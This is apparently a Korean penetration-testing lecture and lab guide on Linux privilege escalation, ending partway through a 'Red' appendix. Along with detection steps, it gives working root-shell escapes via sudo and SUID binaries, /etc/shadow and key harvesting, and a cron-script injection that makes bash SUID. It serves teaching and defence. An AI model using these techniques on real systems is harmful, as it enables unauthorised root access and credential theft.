# Week 05: 권한 상승

## 학습 목표
- 권한 상승(Privilege Escalation)의 개념과 수평/수직 이동의 차이를 이해한다
- Linux 권한 체계(UID, GID, SUID, SGID, Capabilities)를 상세히 설명할 수 있다
- SUID 바이너리를 활용한 권한 상승 기법을 실습하고 원리를 이해한다
- sudo 설정 오류를 이용한 권한 상승을 수행할 수 있다
- 커널 취약점을 이용한 권한 상승의 원리를 이해한다
- GTFOBins 데이터베이스를 활용하여 권한 상승 벡터를 탐색할 수 있다
- 자동화 도구(LinPEAS, LinEnum)를 사용한 권한 상승 벡터 탐색을 수행할 수 있다

## 전제 조건
- Week 01-04 완료 (정찰, 취약점 스캐닝, 웹 공격, 패스워드 공격)
- Linux 파일 퍼미션 기본 이해 (rwx, chmod, chown)
- Linux 프로세스와 사용자 개념
- SSH로 실습 서버 접속 가능

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 권한 상승 이론 + Linux 권한 체계 | 강의 |
| 0:40-1:10 | 권한 상승 기법 분류 + GTFOBins | 강의 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | SUID/sudo 기반 권한 상승 실습 | 실습 |
| 2:00-2:30 | 자동화 도구를 활용한 벡터 탐색 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 종합 권한 상승 시나리오 실습 | 실습 |
| 3:10-3:40 | 방어 기법 + 퀴즈 + 과제 안내 | 토론/퀴즈 |

---

# Part 1: 권한 상승 이론 (40분)

## 1.1 권한 상승이란?

권한 상승(Privilege Escalation)은 현재 사용자의 권한 수준을 넘어서 더 높은 권한을 획득하는 행위이다. 침투 테스트에서 초기 접근(Initial Access) 이후 반드시 수행하는 핵심 단계이다.

**MITRE ATT&CK 매핑:**
```
전술: TA0004 — Privilege Escalation (권한 상승)
  +-- T1548 — Abuse Elevation Control Mechanism
  |     +-- T1548.001 — Setuid and Setgid
  |     +-- T1548.003 — Sudo and Sudo Caching
  |     +-- T1548.004 — Elevated Execution with Prompt
  +-- T1068 — Exploitation for Privilege Escalation
  |     +-- 절차: 커널 취약점(DirtyPipe 등) 악용
  +-- T1055 — Process Injection
  +-- T1053 — Scheduled Task/Job
        +-- T1053.003 — Cron
```

### 권한 상승의 유형

| 유형 | 설명 | 예시 |
|------|------|------|
| **수직 상승 (Vertical)** | 낮은 권한 → 높은 권한 | 일반 사용자 → root |
| **수평 이동 (Horizontal)** | 같은 권한의 다른 계정 | 사용자 A → 사용자 B |

```
수직 상승:
  web (일반 사용자)
       ↓ SUID 악용 / sudo 설정 오류 / 커널 취약점
  root (최고 관리자)

수평 이동:
  web (일반 사용자) → secu (다른 일반 사용자)
       ↓ 공유 자격증명, 키 파일 탈취 등
```

### 왜 권한 상승이 중요한가?

```
[초기 접근] → web 사용자로 SSH 접속 (제한된 권한)
    ↓
  할 수 있는 것: 홈 디렉토리 읽기, 웹 서비스 확인
  할 수 없는 것: /etc/shadow 읽기, 패키지 설치, 방화벽 변경
    ↓
[권한 상승] → root 획득
    ↓
  할 수 있는 것: 모든 파일 읽기/쓰기, 서비스 관리, 백도어 설치
```

## 1.2 Linux 권한 체계 상세

### 사용자와 그룹

| 개념 | 설명 | 확인 명령 |
|------|------|---------|
| UID | 사용자 고유 번호 (0=root) | `id` |
| GID | 그룹 고유 번호 | `id` |
| EUID | 실행 시 유효 사용자 ID | `id -u` |
| 주요 UID | 0=root, 1-999=시스템, 1000+=일반 | `cat /etc/passwd` |

### 파일 퍼미션

```
-rwsr-xr-x 1 root root 12345 Jan 1 00:00 /usr/bin/passwd
|||||||||||
|||||||||+- 기타 사용자: 실행(x)
|||||||+-- 기타 사용자: 읽기(r)
||||||+--- 기타 사용자: 실행(x)
|||||+---- 그룹: 실행(x)
||||+----- 그룹: 읽기(r)
|||+------ 그룹: 실행(x)
||+------- 소유자: 실행(s = SUID + x)  ← SUID 비트!
|+-------- 소유자: 쓰기(w)
+--------- 소유자: 읽기(r)
```

### SUID (Set User ID) — 핵심 개념

| 항목 | 설명 |
|------|------|
| 정의 | 실행 시 파일 소유자의 권한으로 실행됨 |
| 표시 | 소유자 실행 비트가 `s` (예: `-rwsr-xr-x`) |
| 설정 | `chmod u+s file` 또는 `chmod 4755 file` |
| 위험성 | root 소유 SUID 바이너리가 악용되면 즉시 root 획득 |

**SUID 동작 원리:**
```
일반 실행:
  web 사용자 → /usr/bin/cat → UID=web으로 실행 → /etc/shadow 읽기 불가

SUID 실행:
  web 사용자 → /usr/bin/passwd → UID=root로 실행 → /etc/shadow 수정 가능

악용:
  web 사용자 → /usr/bin/find (SUID) → UID=root로 실행 → root 셸 획득!
```

### sudo 설정 (/etc/sudoers)

| 설정 | 의미 | 위험도 |
|------|------|--------|
| `web ALL=(ALL) NOPASSWD: ALL` | 모든 명령을 비밀번호 없이 root로 | 치명적 |
| `web ALL=(ALL) /usr/bin/vim` | vim만 root로 실행 가능 | 높음 (셸 탈출) |
| `web ALL=(ALL) /usr/bin/find` | find만 root로 실행 가능 | 높음 (-exec) |
| `web ALL=(ALL) /usr/bin/less` | less만 root로 실행 가능 | 높음 (!sh) |
| `web ALL=(ALL) /usr/bin/apt-get` | apt-get만 root로 실행 가능 | 중간 |

### Linux Capabilities

기존의 "root vs 일반 사용자" 이분법을 세분화한 권한 체계이다.

| Capability | 설명 | 악용 가능성 |
|-----------|------|-----------|
| `CAP_SETUID` | UID 변경 가능 | root로 전환 |
| `CAP_DAC_READ_SEARCH` | 파일 접근 제한 우회 | shadow 파일 읽기 |
| `CAP_NET_RAW` | raw 소켓 생성 | 패킷 스니핑 |
| `CAP_NET_ADMIN` | 네트워크 설정 변경 | 방화벽 우회 |
| `CAP_SYS_ADMIN` | 시스템 관리 대부분 | 거의 root |

## 1.3 권한 상승 벡터 분류

### 시스템 설정 기반

| 벡터 | 설명 | 탐색 방법 |
|------|------|---------|
| SUID 바이너리 | root 소유 SUID 파일 | `find / -perm -4000 2>/dev/null` |
| sudo 설정 | 특정 명령 허용 | `sudo -l` |
| Capabilities | 세분화된 권한 | `getcap -r / 2>/dev/null` |
| cron job | root 실행 예약 작업 | `cat /etc/crontab` |
| 쓰기 가능 PATH | PATH 경로에 쓰기 가능 | 각 디렉토리 권한 확인 |
| 환경 변수 | LD_PRELOAD 등 | `sudo -l`에서 env_keep 확인 |

### 커널 취약점 기반

| CVE | 이름 | 대상 커널 | CVSS | 설명 |
|-----|------|---------|------|------|
| CVE-2022-0847 | DirtyPipe | 5.8-5.16 | 7.8 | 파이프 버퍼 덮어쓰기 |
| CVE-2021-4034 | PwnKit | 대부분 | 7.8 | pkexec SUID 악용 |
| CVE-2021-3156 | Baron Samedit | sudo <1.9.5 | 7.8 | sudo 힙 오버플로 |
| CVE-2016-5195 | DirtyCow | <4.8.3 | 7.8 | COW 경합 |

## 1.4 GTFOBins

GTFOBins(https://gtfobins.github.io)는 합법적인 Unix 바이너리를 악용하여 권한 상승, 셸 획득, 파일 접근 등이 가능한 방법을 정리한 데이터베이스이다.

**주요 활용 패턴:**

| 바이너리 | SUID 악용 | sudo 악용 |
|---------|---------|---------|
| `find` | `find . -exec /bin/sh -p \;` | `sudo find . -exec /bin/sh \;` |
| `vim` | `vim -c ':!/bin/sh'` | `sudo vim -c ':!/bin/sh'` |
| `less` | `less /etc/passwd` → `!sh` | `sudo less /etc/passwd` → `!sh` |
| `python3` | - | `sudo python3 -c 'import os; os.execl("/bin/sh","sh")'` |
| `nmap` | `nmap --interactive` → `!sh` | `sudo nmap --interactive` → `!sh` |
| `awk` | - | `sudo awk 'BEGIN{system("/bin/sh")}'` |

---

# Part 2: 권한 상승 기법 상세 + 자동화 도구 (30분)

## 2.1 SUID 기반 권한 상승 상세

### SUID 바이너리 탐색 프로세스

```
[1] SUID 바이너리 목록 확인
    find / -perm -4000 -type f 2>/dev/null
    ↓
[2] 비표준 SUID 바이너리 식별
    표준: passwd, su, sudo, mount, ping, ...
    비표준: find, vim, python, nmap, ...  ← 이것들이 공격 대상
    ↓
[3] GTFOBins 확인
    해당 바이너리의 SUID 악용 방법 조회
    ↓
[4] 권한 상승 실행
    쉘 획득 후 id 명령으로 확인
```

## 2.2 sudo 기반 권한 상승 상세

### sudo -l 결과 분석

```
User web may run the following commands on web:
    (ALL) NOPASSWD: ALL        ← 가장 위험: 모든 명령을 root로
    (ALL) NOPASSWD: /usr/bin/find  ← find만 가능이지만 여전히 위험
    (ALL) NOPASSWD: /usr/bin/env   ← env로 임의 명령 실행 가능
```

### 특정 명령만 허용된 경우의 셸 탈출

```bash
# sudo find → 셸 획득
sudo find /tmp -name "anything" -exec /bin/sh \; -quit

# sudo vim → 셸 획득
sudo vim -c ':!/bin/sh'

# sudo less → 셸 획득
sudo less /etc/passwd
# less 내에서 입력: !sh

# sudo python3 → 셸 획득
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'

# sudo env → 셸 획득
sudo env /bin/sh

# sudo awk → 셸 획득
sudo awk 'BEGIN{system("/bin/sh")}'
```

## 2.3 자동화 도구

### LinPEAS (Linux Privilege Escalation Awesome Script)

| 항목 | 설명 |
|------|------|
| 용도 | Linux 권한 상승 벡터 자동 탐색 |
| 경로 | github.com/carlospolop/PEASS-ng |
| 실행 | `./linpeas.sh` |
| 출력 | 색상 코드: 빨강=높은 위험, 노랑=중간, 녹색=정보 |

**LinPEAS 검사 항목:**
- SUID/SGID 바이너리, sudo 설정, Capabilities
- cron jobs, 쓰기 가능한 민감 파일
- Docker/LXC 그룹, 커널 버전 + 알려진 취약점
- 민감 파일 (비밀번호, 키, 토큰), PATH 변수 하이재킹

---

# Part 3: SUID/sudo 기반 권한 상승 실습 (40분)

## 실습 3.1: SUID 바이너리 탐색

### Step 1: SUID 바이너리 목록 확인

> **실습 목적**: 대상 시스템에서 SUID가 설정된 바이너리를 모두 찾고, 악용 가능한 것을 식별한다.
>
> **배우는 것**: SUID 바이너리 탐색법과 표준/비표준 분류

```bash
# web 서버에서 SUID 바이너리 탐색
ssh ccc@10.20.30.80 \
  "find / -perm -4000 -type f 2>/dev/null | sort"
# 예상 출력:
# /usr/bin/chfn
# /usr/bin/chsh
# /usr/bin/fusermount3
# /usr/bin/gpasswd
# /usr/bin/mount
# /usr/bin/newgrp
# /usr/bin/passwd
# /usr/bin/su
# /usr/bin/sudo
# /usr/bin/umount
```

> **결과 해석**:
> - 표준 SUID 바이너리: chfn, chsh, gpasswd, mount, newgrp, passwd, su, sudo, umount
> - 비표준 바이너리(find, vim, python 등)가 SUID로 설정되어 있으면 권한 상승 가능
>
> **실전 활용**: CTF와 모의해킹에서 SUID 탐색은 가장 먼저 시도하는 권한 상승 벡터이다.
>
> **명령어 해설**:
> - `find / -perm -4000`: SUID 비트가 설정된 파일 검색
> - `-type f`: 일반 파일만 (디렉토리 제외)
> - `2>/dev/null`: 권한 거부 에러 숨김
>
> **트러블슈팅**:
> - "Permission denied" 대량 출력: `2>/dev/null` 추가로 에러 숨김
> - 비표준 SUID가 없음: 다른 벡터(sudo, cron, capabilities) 확인

### Step 2: SGID 바이너리와 Capabilities 확인

> **실습 목적**: SUID 외에 SGID와 Capabilities도 권한 상승 벡터가 될 수 있음을 이해한다.
>
> **배우는 것**: 다양한 권한 상승 벡터 탐색

```bash
# SGID 바이너리 탐색
ssh ccc@10.20.30.80 \
  "find / -perm -2000 -type f 2>/dev/null | sort"

# Capabilities 확인
ssh ccc@10.20.30.80 \
  "getcap -r / 2>/dev/null"
# 예상 출력:
# /usr/bin/ping cap_net_raw=ep

# 특히 위험한 capabilities 확인
ssh ccc@10.20.30.80 \
  "getcap -r / 2>/dev/null | grep -E 'setuid|dac_read|sys_admin|net_admin'"
```

> **결과 해석**:
> - `cap_net_raw=ep` on ping: 정상 (ping은 ICMP 패킷 전송에 필요)
> - `cap_setuid`: 이것이 있는 바이너리는 UID를 root(0)로 변경 가능 → 즉시 권한 상승
> - `cap_dac_read_search`: 파일 접근 제한 우회 → /etc/shadow 읽기 가능

## 실습 3.2: sudo 기반 권한 상승

### Step 1: sudo 설정 확인

> **실습 목적**: 현재 사용자의 sudo 설정을 확인하고 권한 상승 가능성을 평가한다.
>
> **배우는 것**: sudo -l 출력 분석과 GTFOBins 활용

```bash
# web 서버에서 sudo 설정 확인
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S -l 2>/dev/null"
# 예상 출력:
# User web may run the following commands on web:
#     (ALL) NOPASSWD: ALL

# NOPASSWD: ALL이 설정되어 있으므로 즉시 root 가능
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S id 2>/dev/null"
# 예상 출력: uid=0(root) gid=0(root) groups=0(root)

# root 셸 획득 확인
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S whoami 2>/dev/null"
# 예상 출력: root
```

> **결과 해석**:
> - `(ALL) NOPASSWD: ALL`: 가장 위험한 설정 — 모든 명령을 비밀번호 없이 root로 실행
> - 공격자가 web 사용자로 접근하면 즉시 root 획득 가능
>
> **실전 활용**: sudo 설정 검사는 모든 권한 상승 시도의 첫 단계이다.
>
> **명령어 해설**:
> - `sudo -S -l`: stdin에서 비밀번호를 읽고(-S) 허용된 명령 목록 표시(-l)
>
> **트러블슈팅**:
> - "sudo: a password is required": NOPASSWD가 설정되지 않은 경우
> - "Sorry, user may not run sudo": sudo 권한 자체가 없는 경우

### Step 2: sudo를 이용한 다양한 권한 상승 기법

> **실습 목적**: sudo로 특정 명령만 허용된 경우에도 셸을 탈출하는 방법을 익힌다.
>
> **배우는 것**: GTFOBins의 sudo 셸 탈출 기법들

```bash
# 방법 1: sudo su (가장 직접적)
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S su -c 'id' 2>/dev/null"
# 예상 출력: uid=0(root) gid=0(root) groups=0(root)

# 방법 2: sudo /bin/bash
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S /bin/bash -c 'id && whoami' 2>/dev/null"
# 예상 출력: uid=0(root)... root

# 방법 3: sudo python3
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S python3 -c 'import os; os.system(\"id\")' 2>/dev/null"
# 예상 출력: uid=0(root)

# 방법 4: sudo find
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S find /tmp -maxdepth 0 -exec id \; 2>/dev/null"
# 예상 출력: uid=0(root)

# 방법 5: sudo env
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S env id 2>/dev/null"
# 예상 출력: uid=0(root)
```

> **결과 해석**:
> - 모든 방법이 root 권한 실행을 달성
> - GTFOBins에 등록된 바이너리는 대부분 셸 탈출이 가능

### Step 3: 민감 파일 접근

> **실습 목적**: root 권한으로 접근할 수 있는 민감 파일들을 확인한다.
>
> **배우는 것**: 권한 상승 후 수집해야 할 핵심 정보

```bash
# root로 shadow 파일 읽기
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S cat /etc/shadow 2>/dev/null | grep -v '^[!*]' | grep -v 'nobody'"
# 예상 출력: 실제 비밀번호 해시가 있는 사용자 목록

# SSH 키 확인
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S find /home -name 'id_rsa' -o -name 'authorized_keys' 2>/dev/null"

# 서비스 설정 파일 (비밀번호 포함 가능)
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S grep -r 'password\|passwd\|secret\|key' /etc/ 2>/dev/null | grep -v Binary | head -20"

# cron job 확인
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S cat /etc/crontab 2>/dev/null; echo 1 | sudo -S ls -la /etc/cron.d/ 2>/dev/null"
```

> **결과 해석**:
> - `/etc/shadow`: 모든 사용자의 비밀번호 해시 → 오프라인 크래킹 가능
> - SSH 개인키: 다른 서버로 수평 이동 가능
> - 설정 파일의 비밀번호: DB, API 키 등 추가 자격증명
> - cron job: root 실행 스크립트에 쓰기 가능하면 추가 권한 상승

## 실습 3.3: 자동화 도구를 활용한 벡터 탐색

### Step 1: LinPEAS 실행

> **실습 목적**: LinPEAS 자동화 도구로 시스템의 모든 권한 상승 벡터를 한 번에 탐색한다.
>
> **배우는 것**: 자동화 도구의 효율성과 결과 분석법

```bash
# LinPEAS 다운로드 (이미 있는 경우 건너뜀)
if [ ! -f /tmp/linpeas.sh ]; then
    curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
    chmod +x /tmp/linpeas.sh
fi

# web 서버로 LinPEAS 전송 및 실행
scp /tmp/linpeas.sh ccc@10.20.30.80:/tmp/ 2>/dev/null
ssh ccc@10.20.30.80 \
  "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh 2>/dev/null" | head -100
# 예상 출력:
# ==========+ System Information +==========
# OS: Ubuntu 22.04...
# Kernel: 6.8.0-106-generic
# ==========+ Interesting Files +==========
# -rwsr-xr-x 1 root root ... /usr/bin/sudo
# User web may run the following commands:
#     (ALL) NOPASSWD: ALL
```

> **결과 해석**:
> - 빨간색/노란색으로 표시된 항목이 권한 상승 가능 벡터
> - `(ALL) NOPASSWD: ALL`은 빨간색(최고 위험)으로 표시
>
> **트러블슈팅**:
> - "Permission denied": 실행 권한 확인 (chmod +x)
> - 출력이 너무 많음: `| tee /tmp/linpeas_result.txt`로 저장 후 분석

### Step 2: 수동 열거 스크립트

> **실습 목적**: 자동화 도구 없이 수동으로 권한 상승 벡터를 탐색한다.
>
> **배우는 것**: 수동 열거 기법과 자동화 도구의 차이

```bash
ssh ccc@10.20.30.80 << 'ENUM'
echo "=== 시스템 정보 ==="
uname -a
cat /etc/os-release | head -3

echo "=== 현재 사용자 ==="
id
groups

echo "=== sudo 설정 ==="
echo 1 | sudo -S -l 2>/dev/null

echo "=== SUID 바이너리 ==="
find / -perm -4000 -type f 2>/dev/null

echo "=== Capabilities ==="
getcap -r / 2>/dev/null

echo "=== 쓰기 가능한 민감 파일 ==="
find /etc -writable -type f 2>/dev/null

echo "=== cron jobs ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null

echo "=== 실행 중인 root 프로세스 ==="
ps aux | grep root | grep -v "\[" | head -10

echo "=== 홈 디렉토리 흥미로운 파일 ==="
find /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" -o -name "id_rsa" 2>/dev/null
ENUM
```

---

# Part 4: 종합 권한 상승 시나리오 (30분)

## 실습 4.1: 공격 체인 — 초기 접근 → 권한 상승 → 정보 수집

### Step 1: 전체 시나리오 실행

> **실습 목적**: Week 01~05까지 배운 기술을 연계하여 완전한 공격 체인을 구성한다.
>
> **배우는 것**: 실제 침투 테스트의 단계별 진행과 기록

```bash
echo "=== 공격 체인: 초기 접근 → 권한 상승 → 정보 수집 ==="

# Phase 1: 정찰 (Week 01)
echo "[Phase 1] 포트 스캔"
echo 1 | sudo -S nmap -sV -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open"

# Phase 2: 취약점 활용 — 패스워드 공격 (Week 04)
echo "[Phase 2] SSH 접근 (약한 비밀번호)"
ssh ccc@10.20.30.80 "echo '[Phase 2] 접근 성공: $(whoami)@$(hostname)'"

# Phase 3: 권한 상승 (Week 05)
echo "[Phase 3] 권한 상승"
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S bash -c 'echo \"[Phase 3] 권한 상승 성공: \$(whoami)\"' 2>/dev/null"

# Phase 4: 민감 정보 수집
echo "[Phase 4] 민감 정보 수집"
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S bash -c '
    echo \"--- shadow 해시 ---\"
    cat /etc/shadow 2>/dev/null | grep -E \"^(web|root):\" | cut -d: -f1-2
    echo \"--- SSH 키 ---\"
    find /home /root -name id_rsa 2>/dev/null
    echo \"--- 네트워크 정보 ---\"
    ip route show | head -3
  ' 2>/dev/null"

echo "[완료] 공격 체인 종료"
```

### Step 2: Bastion 기반 자동화 실행

> **실습 목적**: 전체 권한 상승 프로세스를 Bastion로 자동화하고 증적을 기록한다.
>
> **배우는 것**: 권한 상승 작업의 자동화와 증적 관리

```bash
RESULT=$(curl -s -X POST http://localhost:9100/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: ccc-api-key-2026" \
  -d '{"name":"week05-privesc","request_text":"권한 상승 실습","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

curl -s -X POST "http://localhost:9100/projects/$PID/plan" -H "X-API-Key: ccc-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:9100/projects/$PID/execute" -H "X-API-Key: ccc-api-key-2026" > /dev/null

curl -s -X POST "http://localhost:9100/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: ccc-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"SUID 바이너리 탐색","instruction_prompt":"ssh ccc@10.20.30.80 \"find / -perm -4000 -type f 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"sudo 설정 확인","instruction_prompt":"ssh ccc@10.20.30.80 \"echo 1 | sudo -S -l 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":3,"title":"capabilities 확인","instruction_prompt":"ssh ccc@10.20.30.80 \"getcap -r / 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":4,"title":"권한 상승 실행","instruction_prompt":"ssh ccc@10.20.30.80 \"echo 1 | sudo -S id 2>/dev/null\"","risk_level":"medium","subagent_url":"http://localhost:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }' | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(f'결과: {d[\"overall\"]}')
for t in d.get('task_results',[]):
    print(f'  [{t[\"order\"]}] {t[\"title\"]:25s} → {t[\"status\"]}')
"
```

### Step 3: Blue Team 관점 — 권한 상승 탐지

> **실습 목적**: 권한 상승 시도가 로그에서 어떻게 보이는지 확인한다.
>
> **배우는 것**: 권한 상승 탐지를 위한 로그 분석 포인트

```bash
# sudo 사용 로그 확인
ssh ccc@10.20.30.80 \
  "echo 1 | sudo -S cat /var/log/auth.log 2>/dev/null | grep sudo | tail -10"

# Wazuh에서 권한 상승 관련 경보 확인
ssh ccc@10.20.30.100 \
  "cat /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -i 'sudo\|privilege\|escalat' | tail -10"
```

> **결과 해석**:
> - sudo 사용은 `/var/log/auth.log`에 기록됨
> - Wazuh는 비정상적인 sudo 사용 패턴을 탐지할 수 있음
> - 권한 상승 자체를 막는 것보다, 탐지 후 대응이 현실적

---

## 검증 체크리스트
- [ ] SUID 바이너리를 탐색하고 표준/비표준을 분류했는가
- [ ] sudo -l 결과를 분석하고 GTFOBins에서 악용법을 확인했는가
- [ ] sudo를 이용하여 root 권한을 획득했는가
- [ ] Capabilities를 확인했는가
- [ ] LinPEAS를 실행하여 자동 탐색을 수행했는가
- [ ] 수동 열거 스크립트를 작성하여 실행했는가
- [ ] root 권한으로 민감 파일을 수집했는가
- [ ] 공격 체인(정찰→접근→권한상승→정보수집)을 완성했는가
- [ ] Blue Team 관점에서 권한 상승 탐지 로그를 확인했는가

## 과제

### 과제 1: 권한 상승 보고서 (필수)
- web 서버에서 SUID, sudo, capabilities, cron 등 모든 벡터를 탐색
- 발견된 각 벡터의 악용 방법과 위험도를 분석
- 실제 권한 상승 수행 과정을 단계별로 문서화
- 방어 권장사항을 벡터별로 제시

### 과제 2: 다른 서버 권한 상승 (선택)
- secu(10.20.30.1), siem(10.20.30.100) 서버에서도 권한 상승 벡터 탐색
- 서버 간 차이점 분석 (설정, 서비스, 취약점)
- 전체 인프라의 권한 상승 위험도 평가

### 과제 3: 커스텀 열거 스크립트 (도전)
- bash로 권한 상승 벡터를 자동 탐색하는 커스텀 스크립트 작성
- SUID, sudo, capabilities, cron, 쓰기 가능 파일 등 최소 5개 벡터 검사
- 결과를 위험도별로 분류하여 출력하는 기능 구현

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### LinPEAS / linux-exploit-suggester
> **역할:** Linux 권한 상승 벡터 자동 열거  
> **실행 위치:** `침투 대상 호스트 (저권한 셸)`  
> **접속/호출:** `./linpeas.sh`, `./les.sh`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `/tmp/linpeas.sh` | 업로드 위치 (실행권한 +x) |
| `/dev/shm/` | tmpfs — 로그 잔존이 적어 자주 사용 |

**핵심 설정·키**

- `-a` — 심층 분석(파일 내용까지 스캔)
- `-s` — 빠른 모드

**로그·확인 명령**

- `/tmp/linpeas.out` — 결과 저장

**UI / CLI 요점**

- 결과의 빨강/노랑 highlights — Critical/Probable 권한상승 벡터
- SUID·sudo·cron·capabilities·kernel 섹션 — 체크리스트 핵심

> **해석 팁.** 결과는 **가능성 높은 순**으로 정렬되지만, 실제 exploit은 커널·배포판 버전 의존. `uname -a`/`/etc/os-release`로 대상 확정 후 공개 PoC 선택.

---

## 실제 사례 (WitFoo Precinct 6 — 권한 상승)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *권한 상승* 학습 항목 매칭.

### 권한 상승 의 dataset 흔적 — "4672 (special privs) + 4690 (handle dup)"

dataset 의 정상 운영에서 *4672 (special privs) + 4690 (handle dup)* 신호의 baseline 을 알아두면, *권한 상승* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — 특수 권한 logon 패턴.

```mermaid
graph LR
    SCENE["권한 상승 시나리오"]
    TRACE["dataset 흔적<br/>4672 (special privs) + 4690 (handle dup)"]
    DETECT["탐지 / 분석"]

    SCENE --> TRACE
    TRACE --> DETECT

    style SCENE fill:#ffe6cc
    style DETECT fill:#cce6ff
```

### Case 1: dataset 정량 지표

| 항목 | 값 |
|---|---|
| 핵심 신호 | 4672 (special privs) + 4690 (handle dup) |
| 정량 baseline | 특수 권한 logon 패턴 |
| 학습 매핑 | Linux/Windows privesc 의 audit 흔적 |

**자세한 해석**: Linux/Windows privesc 의 audit 흔적. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.

### Case 2: 실전 적용 시나리오

| 단계 | dataset 활용 |
|---|---|
| 시도 식별 | 4672 (special privs) + 4690 (handle dup) 의 spike |
| 정상 vs 이상 | baseline 대비 비율 |
| 룰 작성 | Suricata / Wazuh / Sigma |
| 검증 | dataset 재실행 |

**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.

### 이 사례에서 학생이 배워야 할 3가지

1. **권한 상승 = 4672 (special privs) + 4690 (handle dup) 의 anomaly** — 정량 신호로 탐지.
2. **baseline 숫자 외우기** — 특수 권한 logon 패턴.
3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.

**학생 액션**: lab CVE-2021-3156 시도 → audit 흔적 추적.


---

## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 05 Privilege Escalation + Blue Detection)

### lab step → 도구 매핑

| step | 학습 항목 | OSS 도구 |
|------|----------|---------|
| s1 | Linux enum | **LinPEAS** |
| s2 | Win enum | WinPEAS / Seatbelt |
| s3 | Cron 실시간 | **pspy64** |
| s4 | Sudo + GTFOBins | gtfobins-cli |
| s5 | 커널 익스플로잇 매칭 | linux-exploit-suggester |
| s6 | Falco 탐지 (Blue) | Falco rules |
| s7 | auditd 사용자 행위 | auditd + ausearch |
| s8 | Wazuh user-behavior | Wazuh module |

### 학생 환경 준비

```bash
# Red 도구 (attacker VM)
mkdir -p ~/peass && cd ~/peass
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh

# pspy64
mkdir -p ~/.local/bin
curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o ~/.local/bin/pspy64
chmod +x ~/.local/bin/pspy64

# linux-exploit-suggester
git clone https://github.com/mzet-/linux-exploit-suggester ~/les
ln -sf ~/les/linux-exploit-suggester.sh ~/.local/bin/les

# GTFOBlookup
pip install gtfobins-cli

# Blue 도구 (모든 VM)
sudo apt install -y auditd audispd-plugins falco
sudo systemctl enable --now auditd

# Falco rule update
sudo falcoctl artifact install falco-rules
```

### Red — Linux privesc 8 단계

```bash
# === Phase 1: 자동 enum (LinPEAS) ===
~/peass/linpeas.sh -a -j > /tmp/linpeas.json
~/peass/linpeas.sh -a -d 10.20.30.80                  # 도메인 정보 추가

# 결과 분석 — interesting findings 만
grep -E '\[!\]|\[+\]' /tmp/linpeas-output.txt | head -50

# === Phase 2: Cron 실시간 모니터 ===
pspy64 -p -f &                                         # background

# 출력 예 (cron 발견):
# 2026-05-02 10:00:01 CMD: UID=0    PID=12345 /usr/bin/python3 /opt/secret.py
# → 5분마다 root 가 실행하는 python script 발견!

# Script 권한 확인
ls -la /opt/secret.py                                  # world-writable?
cat /opt/secret.py

# 만약 -wxr-xr-x:
echo 'os.system("chmod +s /bin/bash")' >> /opt/secret.py
# 5분 대기 → /bin/bash 가 SUID (root)
/bin/bash -p                                           # root shell

# === Phase 3: Sudo + GTFOBins ===
sudo -l
# (root) NOPASSWD: /usr/bin/find

# GTFOBins 매칭
gtfobins find sudo
# 출력: sudo find . -exec /bin/sh \; -quit
# → root shell

sudo find . -exec /bin/sh \; -quit
# # whoami → root!

# === Phase 4: SUID binary 점검 ===
find / -perm -4000 -type f 2>/dev/null

# 비정상 SUID 발견 → GTFOBins 매칭
# 예: /usr/bin/python3 가 SUID 면
gtfobins python3 suid
# 출력: ./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

